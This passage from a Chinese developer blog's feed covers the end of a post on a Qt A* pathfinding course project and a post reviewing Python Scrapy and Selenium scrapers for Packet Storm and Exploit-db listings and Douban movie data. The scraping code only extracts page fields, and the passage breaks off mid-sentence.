class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:JJLibra/Astar.git</span><br></pre></td></tr></table></figure></li><li><p>考虑到GitHub访问比较慢，甚至无法访问，我把网盘链接也附上（提取码：16ca），但只有最新版本的代码：</p></li></ol><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://pan.baidu.com/s/1SwZ1t9c0dEq-w0hxFZM_XA">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/12/30/658f84e46d5ad.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">A-star算法</div>            <div class="tag-link-sitename">百度网盘</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><p>下载源码以后，建议安装 QT Creator 打开 Astar.pro 项目工程文件，即可编辑做二次开发</p><ul><li>Windows 中打包为可执行文件</li></ul><p>推荐使用 Enigma Virtual Box 打包，可以<a href="https://blog.csdn.net/qq_40994692/article/details/113880198">参考这篇博客</a></p><h2 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h2><ul><li>界面设计</li></ul><ol><li>自定义地图宽高</li><li>地图单元格大小可调</li><li>自定义起点、终点、障碍物</li><li>底部状态栏，便于调试</li><li>顶部工具栏可隐藏</li><li>显示最优路径的同时将探索点用不同颜色显示在地图中</li><li>绘制地图可以 .Amap 文件保存到本地文件夹</li><li>可将保存的 .Amap 文件载入地图</li><li>性能分析，数据可视化处理</li><li>生成随机地图（生成逻辑待优化，目前还不能确保生成的地图一定存在可行路径）</li><li>可导入本地图片作为地图背景，一种伪栅格化操作</li><li>“关于我们”页面</li><li>一点拙劣的 QSS 美化</li></ol><ul><li>算法设计</li></ul><ol><li>深度优先搜索算法</li><li>广度优先搜索算法</li><li>Dijkstra 算法</li><li>最佳优先搜索算法</li><li>传统 A 星算法</li><li>双向 A 星算法</li><li>优化 A 星算法<ul><li>三种距离计算定义预估距离 h<ul><li>切比雪夫距离</li><li>曼哈顿距离</li><li>欧几里得距离</li></ul></li><li>整体动态加权 dynamic</li><li>自定义拐角权值 penalty</li><li>自定义安全距离模式 alpha</li></ul></li><li>三种增量式搜索算法（还不够完善，不建议使用）</li></ol><h2 id="程序演示"><a href="#程序演示" class="headerlink" title="程序演示"></a>程序演示</h2><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>由于流量有限，GIF的画质可能不是很高，实际运行情况会更好看的🙏</p></div><ul><li><strong>设置地图</strong></li></ul><p>本项目可以自由设置地图的长宽，单元格有四种状态选择：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://picsur.xxfer.cn/i/c3a189bc-526d-4f70-9222-9bebd2e25146.gif"/></div></div><ul><li><strong>优化Astar算法演示 &amp; 绘制贝塞尔曲线</strong></li></ul><p>下面是其中一种优化A星算法的演示，并且本项目采用<a href="https://blog.csdn.net/sinat_35676815/article/details/120884682">贝塞尔曲线</a>作为无人机最后的路径轨迹：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://d.kstore.space/download/7746/A星﹠贝塞尔.gif"/></div></div><ul><li><strong>生成随机地图 &amp; 重置地图数据</strong></li></ul><p>本项目还支持生成随机地图（生成逻辑比较简单，利用伪随机数生成，大家可以优化一下这里的生成逻辑）和一键重置地图参数：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://picsur.xxfer.cn/i/fe25fc09-01e1-4074-875b-d402ed68fe74.gif"/></div></div><ul><li><strong>保存地图</strong></li></ul><p>考虑到项目的展示环节，不可能现场画地图，所以本项目支持将地图保存到本地：</p><!-- <div class="img-wrap"><div class="img-bg"><img class="img" src="https://picsur.xxfer.cn/i/70dff376-2d17-4ed9-b7a7-9e5b432abc57.gif"/></div></div> --><div class="img-wrap"><div class="img-bg"><img class="img" src="https://d.kstore.space/download/7746/保存地图.gif"/></div></div><ul><li><strong>打开地图 &amp; 深度优先演示</strong></li></ul><p>支持打开保存的.Amap文件，下面还演示了深度优先算法，视频中忘记录<code>深搜最短</code>，实际按下<code>深搜最短</code>可以获得所有深搜路径中的最短路径（深搜实现没有问题，只是操作时需要注意，一步步来，否则容易出bug）：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://picsur.xxfer.cn/i/5f630723-86b5-48d0-b750-989a6ff79598.gif"/></div></div><ul><li><strong>打开和清除背景图片</strong></li></ul><p>本来还想要开发实际地图栅格化的功能，但是太麻烦了，时间不太够，就直接开发了这个导入图片作为背景，然后描绘出地图（提供一种思路：利用百度或者高德等第三方API获取地图数据）：</p><!-- <div class="img-wrap"><div class="img-bg"><img class="img" src="https://picsur.xxfer.cn/i/4854a2e8-79da-4d9a-a974-14db2487354c.gif"/></div></div> --><div class="img-wrap"><div class="img-bg"><img class="img" src="https://d.kstore.space/download/7746/打开﹠清除背景.gif"/></div></div><ul><li><strong>其他功能</strong></li></ul><p>上面只是演示了部分算法和功能，本项目还有不少小细节（关于页、可视化性能分析、操作提示框、页脚状态栏、进入的淡入淡出…）：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://picsur.xxfer.cn/i/943232fc-8901-429a-8e00-c2a66cd8c233.gif"/></div></div><h2 id="其他说明"><a href="#其他说明" class="headerlink" title="其他说明"></a>其他说明</h2><p>由于项目用于学校的课设，所以一些 ico 图标都与 NWPU 相关。如果有同学需要比较原始的版本，可以通过QQ：2565474095 联系我，免费提供代码。当然，如果有什么问题，我会尽我所能回答。另外，项目开发时有很多不规范的地方，小细节有不少但是bug也不少，bug改着改着代码有点史山…大家多多包涵。</p><p>还有一件重要的事，下载源码的同学千万别忘了给个免费的star哦，感谢大家~</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> A星算法 </tag>
            
            <tag> C++ </tag>
            
            <tag> QT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫复习记录</title>
      <link href="/posts/1d3d26fe.html"/>
      <url>/posts/1d3d26fe.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/14/65f2fbeabf86e.png</cover>
      <date>Fri Mar 15 2024 00:00:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<blockquote><p><strong>本文只作为知识点总结，无不良引导。使用爬虫有一定的法律风险，请大家合理利用爬虫工具。</strong></p></blockquote><p>前段时间复习了一下爬虫的相关使用方式，又有了一些新的收获，来博客做一个记录。各位大佬如果有更好用的技巧，请务必指点我🙏</p><h3 id="源代码地址"><a href="#源代码地址" class="headerlink" title="源代码地址"></a>源代码地址</h3><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://github.com/JJLibra/scrapySpider">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/12/17/657ee6859efc1.jpg)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">练习爬虫合集</div>            <div class="tag-link-sitename">小李同学</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><h3 id="爬取-Packet-storm-上的-POC"><a href="#爬取-Packet-storm-上的-POC" class="headerlink" title="爬取 Packet storm 上的 POC"></a>爬取 Packet storm 上的 POC</h3><blockquote><p>注意：GitHub上本案例的代码使用了selenium，之前测试用，但是代码还是能正常跑的，不用担心。scrapy调用driver需要一些时间，运行时如果遇到这样的提示信息，不用着急，等一会儿会跑起来，前提是selenium和driver配置正确。</p></blockquote><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/14/65f3119e19d0f.png"/></div></div><ul><li>目标网站：<a href="https://packetstormsecurity.com/files/tags/exploit/page1/">Packet storm</a></li><li>使用工具：Scrapy、Xpath</li><li>语言：Python</li></ul><p>分析：<br>因为目标网站属于静态网站，所以爬取该网站的信息还是比较容易的，按照常规流程来就行。</p><p>思路：<br>使用Xpath工具定位元素，先抓取需要的详情页锚点链接，然后进入详情页进一步爬取所需数据。</p><p>主要代码简析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取当前页漏洞网址链接</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_vul_list</span>(<span class="params">self, response</span>):</span><br><span class="line">    counter = <span class="number">0</span></span><br><span class="line">    vul_list = response.xpath(<span class="string">&#x27;//a[@class=&quot;ico text-plain&quot;]/@href&#x27;</span>).extract()</span><br><span class="line">    <span class="keyword">for</span> vul <span class="keyword">in</span> vul_list:</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> counter &gt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        vul_url = <span class="string">&#x27;https://packetstormsecurity.com&#x27;</span> + vul</span><br><span class="line">        request = scrapy.Request(url=vul_url, callback=self.parse_vul_inf)</span><br><span class="line">        <span class="keyword">yield</span> request</span><br><span class="line"><span class="comment"># 详情页数据分析</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_vul_inf</span>(<span class="params">self, response</span>):</span><br><span class="line">    item = &#123;&#125;</span><br><span class="line">    item[<span class="string">&#x27;title&#x27;</span>] = response.xpath(<span class="string">&#x27;//strong/text()&#x27;</span>).extract_first() <span class="keyword">if</span> response.xpath(</span><br><span class="line">        <span class="string">&#x27;//strong/text()&#x27;</span>).extract_first() <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    authors = response.xpath(<span class="string">&#x27;//a[@class=&quot;person&quot;]/text()&#x27;</span>).extract() <span class="keyword">if</span> response.xpath(</span><br><span class="line">        <span class="string">&#x27;//a[@class=&quot;person&quot;]/text()&#x27;</span>).extract() <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    item[<span class="string">&#x27;author&#x27;</span>] = <span class="string">&#x27;,&#x27;</span>.join(authors)</span><br><span class="line">    date = response.xpath(<span class="string">&#x27;//dd[@class=&quot;datetime&quot;]/a/@href&#x27;</span>).extract_first() <span class="keyword">if</span> response.xpath(</span><br><span class="line">        <span class="string">&#x27;//dd[@class=&quot;datetime&quot;]/a/@href&#x27;</span>).extract_first() <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;/files/date/(.*?)&#x27;</span>)</span><br><span class="line">    item[<span class="string">&#x27;date&#x27;</span>] = pattern.findall(date)[<span class="number">0</span>]</span><br><span class="line">    item[<span class="string">&#x27;des&#x27;</span>] = response.xpath(<span class="string">&#x27;//dd[@class=&quot;detail&quot;]/p/text()&#x27;</span>).extract_first() <span class="keyword">if</span> response.xpath(</span><br><span class="line">        <span class="string">&#x27;//dd[@class=&quot;detail&quot;]/p/text()&#x27;</span>).extract_first() <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    item[<span class="string">&#x27;vul_type&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    cveid = response.xpath(<span class="string">&#x27;//dd[@class=&quot;cve&quot;]/a/text()&#x27;</span>).extract() <span class="keyword">if</span> response.xpath(</span><br><span class="line">        <span class="string">&#x27;//dd[@class=&quot;cve&quot;]/a/text()&#x27;</span>).extract() <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    item[<span class="string">&#x27;CVE-ID&#x27;</span>] = <span class="string">&#x27;,&#x27;</span>.join(cveid)</span><br><span class="line">    test = response.xpath(<span class="string">&#x27;//div[@class=&quot;src&quot;]/pre/code/text()&#x27;</span>).extract_first() <span class="keyword">if</span> response.xpath(</span><br><span class="line">        <span class="string">&#x27;//div[@class=&quot;src&quot;]/pre/code/text()&#x27;</span>).extract_first() <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    s_replace = test.replace(<span class="string">&#x27;&lt;br&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    s_replace = s_replace.replace(<span class="string">&#x27;&lt;code&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    s_replace = s_replace.replace(<span class="string">&#x27;&lt;/code&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    item[<span class="string">&#x27;poc&#x27;</span>] = s_replace</span><br><span class="line">    <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure><p>这个案例还对<strong>请求头</strong>做了处理，这样不容易被发现。<br>该案例还是比较简单的，又找了一个案例加深印象。</p><h3 id="爬取豆瓣top250电影信息"><a href="#爬取豆瓣top250电影信息" class="headerlink" title="爬取豆瓣top250电影信息"></a>爬取豆瓣top250电影信息</h3><p>该案例的爬取数据会用于之后的NLP练习。</p><ul><li>目标网站：<a href="https://movie.douban.com/top250">豆瓣电影top250</a></li><li>使用工具：Scrapy、Xpath</li><li>语言：Python</li></ul><p>思路：<br>同 Packet storm，对于静态网页的爬取只需要注意避免检测就行了。爬取数据不会受到太多限制。</p><p>主要代码简析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础数据分析</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">    <span class="comment"># 提取当前页电影基础信息</span></span><br><span class="line">    node_list = response.xpath(<span class="string">&#x27;//div[@class=&quot;info&quot;]&#x27;</span>)</span><br><span class="line">    <span class="comment"># 提取基础信息</span></span><br><span class="line">    <span class="keyword">for</span> msg <span class="keyword">in</span> node_list:</span><br><span class="line">        <span class="comment"># 注意：上面已经定位到div[@class=&quot;info&quot;]，所以这里应该使用&#x27;./...&#x27;</span></span><br><span class="line">        <span class="comment"># 详情链接</span></span><br><span class="line">        details_url = msg.xpath(<span class="string">&#x27;./div[@class=&quot;hd&quot;]/a/@href&#x27;</span>).extract()</span><br><span class="line">        <span class="comment"># 中文名称</span></span><br><span class="line">        name_chinese = msg.xpath(<span class="string">&#x27;./div[@class=&quot;hd&quot;]/a/span[1]/text()&#x27;</span>).extract()</span><br><span class="line">        <span class="comment"># 原名</span></span><br><span class="line">        name = msg.xpath(<span class="string">&#x27;./div[@class=&quot;hd&quot;]/a/span[2]/text()&#x27;</span>).extract()</span><br><span class="line">        name = <span class="built_in">str</span>(name).replace(<span class="string">&quot;\\xa0&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="comment"># 别名列表</span></span><br><span class="line">        name_other_list = msg.xpath(<span class="string">&#x27;./div[@class=&quot;hd&quot;]/a/span[3]/text()&#x27;</span>).extract()</span><br><span class="line">        name_other_list = <span class="built_in">str</span>(name_other_list).replace(<span class="string">&quot;\\xa0&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="comment"># 播放状态</span></span><br><span class="line">        player_type = msg.xpath(<span class="string">&#x27;./div[@class=&quot;hd&quot;]/span[@class=&quot;playable&quot;]/text()&#x27;</span>).extract()</span><br><span class="line">        player_type = <span class="built_in">str</span>(player_type)[<span class="number">3</span>:-<span class="number">3</span>]</span><br><span class="line">        <span class="comment"># 评价人数</span></span><br><span class="line">        number_evaluate = msg.xpath(<span class="string">&#x27;./div[@class=&quot;bd&quot;]/div[@class=&quot;star&quot;]/span[4]/text()&#x27;</span>).extract()</span><br><span class="line">        number_evaluate = <span class="built_in">str</span>(number_evaluate)[<span class="number">2</span>:-<span class="number">5</span>]</span><br><span class="line">        <span class="comment"># 评分</span></span><br><span class="line">        score = msg.xpath(<span class="string">&#x27;./div[@class=&quot;bd&quot;]/div[@class=&quot;star&quot;]/span[@property=&quot;v:average&quot;]/text()&#x27;</span>).extract()</span><br><span class="line">        <span class="comment"># 中心主题</span></span><br><span class="line">        purpose = msg.xpath(<span class="string">&#x27;./div[@class=&quot;bd&quot;]/p[@class=&quot;quote&quot;]/span[@class=&quot;inq&quot;]/text()&#x27;</span>).extract()</span><br><span class="line">        <span class="comment"># 使用管道保存，管道可以对键值自动去重</span></span><br><span class="line">        item_pipe = DoubanspiderItem()</span><br><span class="line">        item_pipe[<span class="string">&quot;details_url&quot;</span>] = details_url</span><br><span class="line">        item_pipe[<span class="string">&quot;name_chinese&quot;</span>] = name_chinese</span><br><span class="line">        item_pipe[<span class="string">&quot;name&quot;</span>] = name</span><br><span class="line">        item_pipe[<span class="string">&quot;name_other_list&quot;</span>] = name_other_list</span><br><span class="line">        item_pipe[<span class="string">&quot;player_type&quot;</span>] = player_type</span><br><span class="line">        item_pipe[<span class="string">&quot;number_evaluate&quot;</span>] = number_evaluate</span><br><span class="line">        item_pipe[<span class="string">&quot;score&quot;</span>] = score</span><br><span class="line">        item_pipe[<span class="string">&quot;purpose&quot;</span>] = purpose</span><br><span class="line">        time.sleep(self.step_time)</span><br><span class="line">        <span class="comment"># 转交控制权（scrapy基于Twisted开发，感兴趣的自行了解），继续提取详情数据</span></span><br><span class="line">        <span class="keyword">yield</span> Request(details_url[<span class="number">0</span>], callback=self.get_details, meta=&#123;<span class="string">&quot;info&quot;</span>: item_pipe&#125;)</span><br><span class="line">    <span class="comment"># 控制页号，利用每一页25部电影进行换页</span></span><br><span class="line">    self.page_number += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(self.page_number)</span><br><span class="line">    <span class="comment"># 爬取其他页面</span></span><br><span class="line">    <span class="keyword">if</span> self.page_number &lt; <span class="number">10</span>:</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        page_url = <span class="string">&#x27;https://movie.douban.com/top250?start=&#123;&#125;&amp;filter=&#x27;</span>.<span class="built_in">format</span>(self.page_number * <span class="number">25</span>)</span><br><span class="line">        <span class="keyword">yield</span> scrapy.Request(page_url, callback=self.parse)</span><br><span class="line"><span class="comment"># 获取详情页数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_details</span>(<span class="params">self, response</span>):</span><br><span class="line">    <span class="comment"># 以支持在item_pipe继续补充数据</span></span><br><span class="line">    item_pipe = DoubanspiderItem()</span><br><span class="line">    info = response.meta[<span class="string">&quot;info&quot;</span>]</span><br><span class="line">    item_pipe.update(info)</span><br><span class="line">    <span class="comment"># 详情页基础信息</span></span><br><span class="line">    response = response.xpath(<span class="string">&#x27;//div[@id=&quot;info&quot;]&#x27;</span>)</span><br><span class="line">    <span class="comment"># 编剧列表</span></span><br><span class="line">    writer_list = response.xpath(<span class="string">&#x27;./span[2]/span[@class=&quot;attrs&quot;]/a/text()&#x27;</span>).extract() <span class="keyword">if</span> response.xpath(</span><br><span class="line">        <span class="string">&#x27;./span[2]/span[@class=&quot;attrs&quot;]/a/text()&#x27;</span>).extract() <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 导演列表</span></span><br><span class="line">    director_list = response.xpath(<span class="string">&#x27;./span[1]/span[@class=&quot;attrs&quot;]/a/text()&#x27;</span>).extract() <span class="keyword">if</span> response.xpath(</span><br><span class="line">        <span class="string">&#x27;./span[1]/span[@class=&quot;attrs&quot;]/a/text()&#x27;</span>).extract() <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 主演列表</span></span><br><span class="line">    star_list = response.xpath(<span class="string">&#x27;string(./span[@class=&quot;actor&quot;]/span[@class=&quot;attrs&quot;])&#x27;</span>).extract() <span class="keyword">if</span> response.xpath(</span><br><span class="line">        <span class="string">&#x27;string(./span[@class=&quot;actor&quot;]/span[@class=&quot;attrs&quot;])&#x27;</span>).extract() <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 官方网站</span></span><br><span class="line">    official_url = response.xpath(<span class="string">&#x27;./a[@rel=&quot;nofollow&quot; and @target=&quot;_blank&quot;]/@href&#x27;</span>).extract() <span class="keyword">if</span> response.xpath(</span><br><span class="line">        <span class="string">&#x27;./a[@rel=&quot;nofollow&quot; and @target=&quot;_blank&quot;]/@href&#x27;</span>).extract() <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 上映时间</span></span><br><span class="line">    release_data = response.xpath(<span class="string">&#x27;./span[@property=&quot;v:initialReleaseDate&quot;]/text()&#x27;</span>).extract() <span class="keyword">if</span> response.xpath(</span><br><span class="line">        <span class="string">&#x27;./span[@property=&quot;v:initialReleaseDate&quot;]/text()&#x27;</span>).extract() <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 制片国，发现制片地区无法直接使用xpath直接定位，下面这样处理</span></span><br><span class="line">    area = <span class="built_in">str</span>(response.extract())</span><br><span class="line">    area = area[area.index(<span class="string">&quot;制片国&quot;</span>):area.index(<span class="string">&quot;语言&quot;</span>)].strip()</span><br><span class="line">    area = area[area.index(<span class="string">&quot;&lt;/span&gt;&quot;</span>) + <span class="number">7</span>:area.index(<span class="string">&quot;&lt;br&gt;&quot;</span>)].strip() <span class="keyword">if</span> area[area.index(<span class="string">&quot;&lt;/span&gt;&quot;</span>) + <span class="number">7</span>:area.index(</span><br><span class="line">        <span class="string">&quot;&lt;br&gt;&quot;</span>)].strip() <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 语言，同上处理</span></span><br><span class="line">    languages = <span class="built_in">str</span>(response.extract())</span><br><span class="line">    languages = languages[languages.index(<span class="string">&quot;语言&quot;</span>):languages.index(<span class="string">&quot;上映&quot;</span>)].strip()</span><br><span class="line">    languages = languages[languages.index(<span class="string">&quot;&lt;/span&gt;&quot;</span>) + <span class="number">7</span>:languages.index(<span class="string">&quot;&lt;br&gt;&quot;</span>)].strip()</span><br><span class="line">    <span class="comment"># 片长</span></span><br><span class="line">    times = response.xpath(<span class="string">&#x27;./span[@property=&quot;v:runtime&quot;]/text()&#x27;</span>).extract()</span><br><span class="line">    <span class="comment"># 类型</span></span><br><span class="line">    film_type = response.xpath(<span class="string">&#x27;./span[@property=&quot;v:genre&quot;]/text()&#x27;</span>).extract()</span><br><span class="line">    item_pipe[<span class="string">&quot;writer_list&quot;</span>] = writer_list</span><br><span class="line">    item_pipe[<span class="string">&quot;director_list&quot;</span>] = director_list</span><br><span class="line">    item_pipe[<span class="string">&quot;star_list&quot;</span>] = star_list</span><br><span class="line">    item_pipe[<span class="string">&quot;official_url&quot;</span>] = official_url</span><br><span class="line">    item_pipe[<span class="string">&quot;release_data&quot;</span>] = release_data</span><br><span class="line">    item_pipe[<span class="string">&quot;area&quot;</span>] = area</span><br><span class="line">    item_pipe[<span class="string">&quot;languages&quot;</span>] = languages</span><br><span class="line">    item_pipe[<span class="string">&quot;times&quot;</span>] = times</span><br><span class="line">    item_pipe[<span class="string">&quot;film_type&quot;</span>] = film_type</span><br><span class="line">    <span class="keyword">yield</span> item_pipe</span><br></pre></td></tr></table></figure><h3 id="爬取安居客二手房数据"><a href="#爬取安居客二手房数据" class="headerlink" title="爬取安居客二手房数据"></a>爬取安居客二手房数据</h3><ul><li>使用工具同上</li></ul><p>两年前写的，不能保证现在是否还有效，前段时间看的时候好像不行了，但逻辑应该还能使用，应该只需要修改修改就能跑，自行了解。</p><h3 id="爬取-Exploit-db-上的-POC"><a href="#爬取-Exploit-db-上的-POC" class="headerlink" title="爬取 Exploit-db 上的 POC"></a>爬取 Exploit-db 上的 POC</h3><ul><li>目标网站：<a href="https://www.exploit-db.com/">Exploit-db</a></li></ul><p>本案例我们需要爬取的内容就是动态加载的资源。关于网站的静态和动态资源，可以参考我写的这篇<a href="https://blog.xxfer.cn/posts/d98373ae.html">网站资源类型及其加速原理</a>。简单来说，静态网页是在服务器端生成并发送给客户端的<strong>固定内容</strong>，内容在客户端展示时并不会发生变化。而动态网页则是在客户端加载和渲染过程中，通过<strong>JavaScript等脚本技术</strong>动态生成和更新内容。这使得动态网页的内容无法通过简单地下载HTML源码来获取，而需要模拟浏览器行为来执行脚本并获取最终呈现的内容。</p><p>我一开始还是想通过<strong>Scrapy</strong>来爬取的，但是会发现这个网站存在异步加载，那么Scrapy提供的下载器就不是那么好用了，或者可以说失效了。因为这部分数据需要在客户端加载，而下载器无法渲染这部分数据，所以直接使用<strong>Scrapy</strong>，是得不到我们想要的POC数据的。</p><p>然后就想着使用<strong>Scrapy+Selenium</strong>，通过编写中间件，用<strong>selenium</strong>去模拟浏览器的行为，从而得到那一部分数据的<strong>response</strong>。很遗憾，我并没有成功，理论上应该是可行的，应该是代码写的有点问题，运行结果有返回的response，但里面还是没有需要的数据。这种思路应该是正确的，之后可以继续研究一下。</p><p>观察响应：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/14/65f3099373d19.png"/></div></div><p>既然这条路走不通，我就直接上<strong>selenium</strong>，不仅成功了，代码也挺简洁的。<strong>开始的两个案例当然也能使用selenium爬取，但一般不会这么做，因为效率会降低。selenium主要还是用在动态网站的数据爬取上。</strong></p><p>思路：<br>因为目标网站使用了<strong>异步加载</strong>，所以需要借助<strong>selenium</strong>等自动工具模拟浏览器的行为，从而渲染得到所需数据。只要渲染成功，爬取步骤与静态网页的爬取类似。</p><details class="folding-tag" green><summary> 关于本案例网站的异步加载 </summary>              <div class='content'>              <p>本案例中目标网站使用了<code>Ajax</code>，依据：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/14/65f307a6cf329.png"/></div></div><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/14/65f307b40293d.png"/></div></div><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/14/65f307be943fa.png"/></div></div><p>关于<code>Ajax</code>，大家可以学习这个视频，简单了解什么是<code>Ajax</code>：</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://www.bilibili.com/video/BV1jv411P7Hp/?spm_id_from=333.337.search-card.all.click&vd_source=91a233ea2e45cea087336c119461d12b">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/12/30/658fb2cbc152c.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">Ajax 是什么?</div>            <div class="tag-link-sitename">技术蛋老师</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><p>简单来说，Ajax 